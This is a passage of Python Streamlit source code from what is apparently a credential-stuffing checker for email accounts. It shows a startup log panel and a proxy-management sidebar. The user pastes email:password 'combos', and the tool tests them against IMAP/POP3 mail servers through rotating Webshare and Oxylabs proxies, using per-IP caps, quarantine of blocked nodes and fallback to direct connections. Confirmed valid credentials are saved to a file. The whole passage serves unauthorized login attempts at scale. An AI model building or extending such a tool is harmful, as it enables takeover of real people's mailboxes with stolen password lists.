        em = em.strip().lower()
        if not em:
            continue
        merged[em] = rest.split("|")[0].strip()
    try:
        with file_write_lock:
            with open(CLEAN_VALID_FILE, "w", encoding="utf-8") as f:
                f.write(header)
                for em in sorted(merged):
                    f.write(f"{em}:{merged[em]}\n")
    except Exception:
        pass
    return len(merged)
# @@END 078 CLEAN_VALID_IO

# @@BLOCK 079 STARTUP_PANEL_UI deps=034,038
section_title("🖥️", "Startup & Under-The-Hood Display Panel",
              "system boot, config injection, proxy health, engine state transitions")

with str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood",
                      expanded=False):
    str_lit.markdown("Real-time activity ledger recording system boot, config injection, "
                     "proxy health checks, and engine state transitions:")
    str_lit.code("\n".join(startup_panel_lines()), language="text")
    col_st1, col_st2 = str_lit.columns(2)
    with col_st1:
        if str_lit.button("🔄 Refresh Startup Screen"):
            str_lit.rerun()
    with col_st2:
        if str_lit.button("🧹 Clear Startup Logs"):
            str_lit.session_state.startup_entries = []
            with _STARTUP_BUFFER_LOCK:
                _STARTUP_BUFFER.clear()
                _STARTUP_SEEN.clear()
            log_startup("Startup logs cleared by user.")
            str_lit.rerun()
# @@END 079 STARTUP_PANEL_UI

# @@BLOCK 080 PROXY_MGMT_UI deps=014,016,024,043,052,058,068,070,073,074,077
with str_lit.sidebar:
    str_lit.markdown("---")
    str_lit.markdown("### 🌐 Proxy Management & Health")

    if (not all_proxies) and WEBSHARE_KEYS and not STATE.get("bootstrap_done"):
        STATE["bootstrap_done"] = True
        with str_lit.spinner("First run - fetching and validating your proxy pool..."):
            try:
                fetch_and_test_all_proxies(silent=True)
            except Exception as _be:
                log_startup(f"WARNING: auto-bootstrap failed: {_be}")
        all_proxies = load_proxies()
        filtered_pool = get_filtered_active_proxies(quiet=True)

    if (STATE.get("last_probe_ts", 0.0) == 0.0 and all_proxies
            and not STATE.get("probe_in_flight")
            and not STATE.get("first_probe_kicked")):
        STATE["first_probe_kicked"] = True
        log_probe_event("first-load probe kicked to a background thread (UI not blocked)")
        threading.Thread(
            target=lambda: refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET),
            daemon=True, name="first-probe").start()
        str_lit.caption("⏳ First probe running in the background - the page is already usable.")

    _q_now = quarantine_size()
    _alive_now = len(alive_pool)
    _last_ts = STATE.get("last_probe_ts", 0.0)
    _age = int(time.time() - _last_ts) if _last_ts else -1
    _age_txt = f"{_age}s ago" if _age >= 0 else "never"

    _ips = {parse_proxy(p)["host"] for p in all_proxies if parse_proxy(p)}
    _subs = {_subuser_of(p) for p in all_proxies if _subuser_of(p)}
    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** lines / **{len(_ips)}** IPs / "
                 f"**{len(_subs)}** sub-users | Filtered: **{len(filtered_pool)}** | "
                 f"Alive: **{_alive_now}**")

    if all_proxies and not filtered_pool:
        str_lit.error("⚠ **Every proxy was filtered out** by Min Proxy Score / pool mode / "
                      "circuit breaker. Lower 'Min Proxy Score' or press ♻️ Lift 407 "
                      "Quarantine. The raw list is NOT used as a silent fallback.")

    if _alive_now and not STATE.get("run_active"):
        str_lit.success(
            f"✅ READY - **{_alive_now}** validated node(s) armed. "
            f"Paste your combos and press 🔥 Start Live Checking Engine. Nothing else to set."
        )
    elif not all_proxies and not WEBSHARE_KEYS:
        str_lit.info("No proxies configured - press 📥 Fetch & Test All Proxies, or run "
                     "fully DIRECT.")

    _p_ok, _p_auth, _p_to, _p_dead = probe_summary()
    str_lit.caption(
        f"Probe ({CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)}, {probe_timeout():.0f}s): "
        f"pass **{_p_ok}** | 407 auth **{_p_auth}** | timeout/reset **{_p_to}** | "
        f"dead **{_p_dead}**  ·  last probe {_age_txt}  ·  runs {STATE.get('probe_runs', 0)}"
        + ("  ·  STRICT OFF" if not CFG.get("PROBE_STRICT", True) else "")
    )
    str_lit.caption(f"Probe targets in use: "
                    f"{', '.join(t[0] + ':' + str(t[1]) for t in probe_targets())}")
    str_lit.caption(f"Protocols dialled: **{' + '.join(active_protocols())}**")

    _ms = STATE.get("mail_spot") or {}
    if _ms.get("n"):
        _ms_age = int(time.time() - _ms.get("ts", 0))
        _ms_txt = (f"Mail-destination spot check ({_ms['host']}:{_ms['port']}): "
                   f"pass **{_ms['ok']}** | 407 **{_ms['auth']}** | other **{_ms['other']}** "
                   f"/ {_ms['n']} node(s), {_ms_age}s ago")
        if _ms.get("auth") and not _ms.get("ok"):
            str_lit.error(
                "🚨 " + _ms_txt + " - the pool passes the WEB probe but the provider is "
                "refusing MAIL destinations with 407. Set **Proxy Mode Engine = off** "
                "(DIRECT) or wait for the 'email servers' cap to reset. Those passwords "
                "are still untested."
            )
        else:
            str_lit.caption(_ms_txt)

    _tr = _probe_target_reachability()
    _tr_txt = "  ".join(f"{r['target']} {'OK' if r['ok'] else 'FAIL'}" for r in _tr)
    str_lit.caption(f"App-host direct reachability: {_tr_txt}")
    str_lit.caption(
        f"Concurrency: host cap **{CFG.get('HOST_CONCURRENCY')}** · per-IP cap "
        f"**{CFG.get('PROXY_IP_CONCURRENCY')}** · per-SUBUSER cap "
        f"**{CFG.get('PROXY_SUBUSER_CONCURRENCY')}** · proxy cap "
        f"**{CFG.get('PROXY_CONCURRENCY')}**"
        f" · rotation **{'RANDOM' if CFG.get('RANDOM_ROTATION') else 'round-robin'}**"
    )
    _rb = request_budget()
    str_lit.caption(
        f"Request budget: ~**{_rb['per_account']}** proxy request(s) per account worst case · "
        f"**{_rb['idle_per_min']:.0f}/min** background probing while idle · "
        f"**{_rb['cycle']}** per full pool cycle"
        + ("" if CFG.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT)
           else "  ·  idle probing **OFF** (probes only on load / Start / Re-probe)")
    )
    str_lit.caption(
        f"407 contract: quarantine after **{PROXY_407_QUARANTINE}** strikes · "
        f"force DIRECT after **{PROXY_407_FORCE_DIRECT}** in a rung · "
        f"park **{PROXY_407_COOLDOWN:.0f}s** · "
        f"same-host retries **{CFG.get('SAME_HOST_RETRIES')}** · "
        f"legacy 143/110 leash **{LEGACY_RUNG_TIMEOUT:.0f}s**"
    )
    str_lit.caption(
        f"Verdict guard: WRONG is confirmed across hosts = "
        f"**{CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')}** · "
        f"self-signed = **{CFG.get('ALLOW_SELF_SIGNED')}** "
        f"(strict={CFG.get('TLS_STRICT')})"
    )

    if _q_now:
        str_lit.warning(f"🩹 Quarantined for 407: **{_q_now}** node(s)")
    if not all_proxies:
        str_lit.caption("No proxies configured - the engine will run fully DIRECT until "
                        "you add some.")
    elif _alive_now == 0:
        str_lit.warning("⚠ No node passed the tunnel probe. Press 📥 Fetch & Test All "
                        "Proxies again.")
    else:
        str_lit.caption("A 407 means the PROXY rejected your credentials - usually a "
                        "per-sub-user cap, not a dead node. A socket reset is reported "
                        "separately. A LOGIN_DROPPED (* BYE) is a MAIL-SERVER event, "
                        "not a proxy one.")

    _rc1, _rc2, _rc3 = str_lit.columns(3)
    with _rc1:
        if str_lit.button("🔁 Re-probe pool now", use_container_width=True):
            clear_tunnel_cache()
            refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
            str_lit.success("Pool re-probed.")
            str_lit.rerun()
    with _rc2:
        if str_lit.button("🧾 Show raw proxies.txt", use_container_width=True):
            try:
                with open(CFG["PROXY_FILE"], encoding="utf-8", errors="ignore") as _pf:
                    _lines = [l.rstrip() for l in _pf if l.strip()]
                _uniq = list(dict.fromkeys(_lines))
                str_lit.caption(f"{len(_lines)} line(s), {len(_uniq)} unique, "
                                f"{'CREDS present' if any('@' in l for l in _lines) else 'NO CREDS (@ absent)'}")
                str_lit.code("\n".join(_lines[:60]), language="text")
            except Exception as _pf_err:
                str_lit.error(f"Could not read proxies.txt: {_pf_err}")
    with _rc3:
        if str_lit.button("↩️ Restore from proxies_all.txt", use_container_width=True,
                          help="Fetch & Test writes only the SURVIVORS into proxies.txt. "
                               "This puts the full raw fetched pool back."):
            try:
                if os.path.exists("proxies_all.txt"):
                    with open("proxies_all.txt", encoding="utf-8", errors="ignore") as _rf:
                        _restore = [l.strip() for l in _rf
                                    if l.strip() and not l.strip().startswith("#")]
                    if _restore:
                        with file_write_lock:
                            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as _wf:
                                _wf.write("\n".join(_restore) + "\n")
                        clear_tunnel_cache()
                        log_startup(f"proxies.txt restored from proxies_all.txt "
                                    f"({len(_restore)} line(s)).")
                        str_lit.success(f"Restored {len(_restore)} line(s) from proxies_all.txt.")
                        str_lit.rerun()
                    else:
                        str_lit.warning("proxies_all.txt is empty.")
                else:
                    str_lit.warning("No proxies_all.txt yet - run Fetch & Test first.")
            except Exception as _rex:
                str_lit.error(f"Restore failed: {_rex}")

    with str_lit.expander("➕ Add Custom Proxies", expanded=False):
        custom_proxy_text = str_lit.text_area(
            "Paste proxies (host:port or user:pass@host:port)",
            placeholder="123.45.67.89:8080", height=100)
        if str_lit.button("Save Custom Proxies"):
            if custom_proxy_text.strip():
                try:
                    new_proxies = [l.strip() for l in custom_proxy_text.splitlines()
                                   if l.strip() and not l.strip().startswith("#")]
                    combined = list(dict.fromkeys(load_proxies() + new_proxies))
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(combined) + "\n")
                    clear_tunnel_cache()
                    log_startup(f"Added {len(new_proxies)} custom proxies successfully.")
                    str_lit.success(f"Added {len(new_proxies)} custom proxies successfully!")
                    str_lit.rerun()
                except Exception as ex:
                    str_lit.error(f"Error saving custom proxies: {ex}")

    if str_lit.button("📥 Fetch & Test All Proxies"):
        with str_lit.spinner("Fetching from Webshare & Oxylabs and validating every line..."):
            _n_alive, _n_total = fetch_and_test_all_proxies()
        _msr = STATE.get("mail_spot") or {}
        if _n_alive:
            str_lit.success(
                f"✅ READY - **{_n_alive}** working node(s) from **{_n_total}** line(s) "
                f"validated, saved and armed. Press 🔥 Start Live Checking Engine."
            )
            if _msr.get("auth") and not _msr.get("ok"):
                str_lit.error(
                    f"🚨 ...but the MAIL-destination spot check 407'd on "
                    f"{_msr['auth']}/{_msr['n']} sampled node(s) against "
                    f"{_msr['host']}:{_msr['port']}. The provider is capping email-server "
                    f"destinations - set **Proxy Mode Engine = off** until it resets."
                )
        else:
            str_lit.warning("No node passed validation. Check WEBSHARE_KEYS in secrets.")
        str_lit.rerun()

    with str_lit.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
        with probe_stats_lock:
            _pstats = dict(probe_stats)
        if proxy_meta:
            rows = []
            for p_str, meta in proxy_meta.items():
                info = parse_proxy(p_str)
                _ps = _pstats.get(p_str) or {}
                if _ps:
                    _rlabel = _PROBE_REASON_LABEL.get(_ps.get("reason", ""),
                                                      _ps.get("reason", ""))
                    _age2 = f"{int(time.time() - _ps.get('ts', time.time()))}s ago"
                    _last = f"{_rlabel} · {_age2}"
                else:
                    _last = "-"
                rows.append({
                    "Proxy": f"{info['host']}:{info['port']}" if info else "Unknown",
                    "User": (info.get("user") if info else "") or "",
                    "Latency": f"{meta.get('latency_ms', 'N/A')} ms",
                    "Country": meta.get("country", "Unknown"),
                    "Region": meta.get("region", "Unknown"),
                    "Score": meta.get("score", 50),
                    "Fails": meta.get("fails", 0),
                    "Successes": meta.get("success", 0),
                    "407s": _proxy_407.get(p_str, 0),
                    "Parked": "yes" if _proxy_407_parked(p_str) else "",
                    "Attempts": _ps.get("attempts", 0),
                    "Last Probe": _last,
                    "Last Error": (_ps.get("error", "") or "")[:200],
                    "Quarantined": "yes" if proxy_is_quarantined(p_str) else "",
                })
            str_lit.caption(
                f"Probe target {CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)} · "
                f"budget {probe_timeout():.0f}s · strict={CFG.get('PROBE_STRICT', True)} · "
                f"dedupe={CFG.get('DEDUPE_PROXIES', True)} · "
                f"max_targets={CFG.get('PROBE_MAX_TARGETS')} · "
                f"scheme2={CFG.get('PROBE_SECOND_SCHEME')} · "
                f"idle_probe={CFG.get('PROBER_IDLE_ENABLED')} · "
                f"mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
            )
            str_lit.dataframe(pd.DataFrame(rows), use_container_width=True)
            col_ref1, col_ref2, col_ref3, col_ref4 = str_lit.columns(4)
            with col_ref1:
                if str_lit.button("🔄 Refresh Dashboard"):
                    str_lit.rerun()
            with col_ref2:
                if str_lit.button("🔁 Re-probe All"):
                    clear_tunnel_cache()
                    refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
                    str_lit.success("Re-probed.")
                    str_lit.rerun()
            with col_ref3:
                if str_lit.button("🧹 Clean Dead / Low-Score"):
                    with proxy_lock:
                        for k, m in list(proxy_meta.items()):
                            if m.get("score", 50) < 5 or m.get("fails", 0) >= 10:
                                proxy_meta.pop(k, None)
                    save_proxy_meta()
                    str_lit.success("Cleaned!")
                    str_lit.rerun()
            with col_ref4:
                if str_lit.button("♻️ Lift 407 Quarantine"):
                    clear_proxy_quarantine()
                    str_lit.success("Quarantine lifted.")
                    str_lit.rerun()
        else:
            str_lit.info("No proxy metadata recorded yet.")
# @@END 080 PROXY_MGMT_UI
